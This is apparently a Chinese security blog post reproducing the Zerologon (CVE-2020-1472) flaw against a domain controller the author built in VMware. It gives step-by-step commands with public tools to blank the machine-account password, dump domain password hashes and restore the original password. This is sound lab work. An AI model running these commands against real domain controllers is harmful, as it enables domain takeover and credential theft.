---
layout:     post
title:      "利用CVE-2020-1472(Zerologin)漏洞远程获取域控服务器密码hash"
date:       2020-11-27
author:     "Ambi9u0us"
catalog: true
tags:
    - 渗透
    - 漏洞
    - 域控
typora-root-url: ..
---

# 利用CVE-2020-1472(Zerologin)漏洞远程获取域控服务器密码hash

本文针对之前微软曝光的CVE-2020-1472漏洞即ZeroLogin漏洞进行复现，基本还原了该漏洞的实现过程。

## 0x01 搭建域控服务器

本文采用windows server 2012作为域控服务器系统，在VMware上进行搭建，在VMware上安装好虚拟机后，搭建域控服务器流程如下：

首先将虚拟机联网方式设置为NAT模式，然后给虚拟机设置一个固定的IP，因为后面添加域控服务时是与IP绑定的，后面IP如果变化会导致域控服务器无法访问

![image-20201205160747989](/img/in-post/image-20201205160747989.png)

然后选择`添加角色和功能`，安装`AD轻型目录服务`和`AD域服务`

![image-20201204183954811](/img/in-post/image-20201204183954811.png)

一直点击下一步，直到出现安装按钮，点击安装。

点击`AD DS`，点击更多，选择`将此服务器提升为域控服务器`

![image-20201204190137084](/img/in-post/image-20201204190137084.png)

选择`添加新林`，根据自己需要设置域名

![image-20201204190559472](/img/in-post/image-20201204190559472.png)

然后设置密码时要注意密码要具有一定的复杂度

![image-20201204190906974](/img/in-post/image-20201204190906974.png)

一直点击下一步，如果出现了下面的问题，则是因为没有设置Administrator账户密码的原因，设置一下密码就可以了

![image-20201204191520338](/img/in-post/image-20201204191520338.png)

安装完成后，重新启动虚拟机，域控服务器的测试环境就搭建完毕。

![image-20201204192634257](/img/in-post/image-20201204192634257.png)

## 0x02 漏洞测试

在进行测试之前，要去[SecureAuthCorp](https://github.com/SecureAuthCorp)/**[impacket](https://github.com/SecureAuthCorp/impacket)**项目自行下载impact后安装，直接使用pip下载后面执行脚本会出错

首先使用[SecuraBV](https://github.com/SecuraBV)/**[CVE-2020-1472](https://github.com/SecuraBV/CVE-2020-1472)**的zerologon_tester.py脚本对漏洞进行测试，执行命令：

`python zerologon_tester.py [NetBios Name] IP `

其中，主机名可以通过在命令行窗口执行net group获得，IP为对应的域控服务器IP，如果目标域控服务器无该漏洞，会得到如下结果：

![image-20201204204835415](/img/in-post/image-20201204204835415.png)

如果目标服务器有漏洞，结果如下：

![image-20201204215910021](/img/in-post/image-20201204215910021.png)

## 0x03 实现远程获取域控服务器密码hash

首先要分别从[risksense](https://github.com/risksense)/**[zerologon](https://github.com/risksense/zerologon)**项目和[k8gege](https://github.com/k8gege)/**[CVE-2020-1472-EXP](https://github.com/k8gege/CVE-2020-1472-EXP)**项目获取到set_empty_pw.py、secretsdump.py和reinstall_original_pw.py，然后进行如下操作：

### 清空目标域控服务器主机名对应的用户的密码

输入命令`python set_empty_pw.py [Name] [IP]`，结果如下

![image-20201205173127624](/img/in-post/image-20201205173127624.png)

### 远程获取目标域控服务器的密码hash方法一

输入命令`python secretsdump.py [Name]$@[IP] -just-dc -no-pass`，如下所示：

![image-20201205173226098](/img/in-post/image-20201205173226098.png)

### 远程获取目标域控服务器的原始NT hash值方法二

输入`python secretsdump.py -sam sam.save -system system.save -security security.save [Name]$@[IP]`

![image-20201205173707166](/img/in-post/image-20201205173707166.png)

这里会提示要输入密码，不过由于之前已经将密码置为空，因此直接点击回车即可

### 将目标服务器密码还原

输入`python reinstall_original_pw.py [Name] [IP] [hash]`，这里的hash值应该为前面获取到的对应主机名的hash

![image-20201205175150903](/img/in-post/image-20201205175150903.png)

### 测试密码还原情况

此时，再使用前面的方法获取目标域控服务器的hash值，发现获取失败

![image-20201205175209579](/img/in-post/image-20201205175209579.png)

##  后记

本文主要介绍了如何利用CVE-2020-1472漏洞远程获取目标域控服务器的密码hash值并进行密码还原，基本梳理清楚了zerologin漏洞的利用过程。

## Reference

[Active Directory虚拟机搭建域控服务器环境](https://www.cnblogs.com/IFire47/p/6683435.html)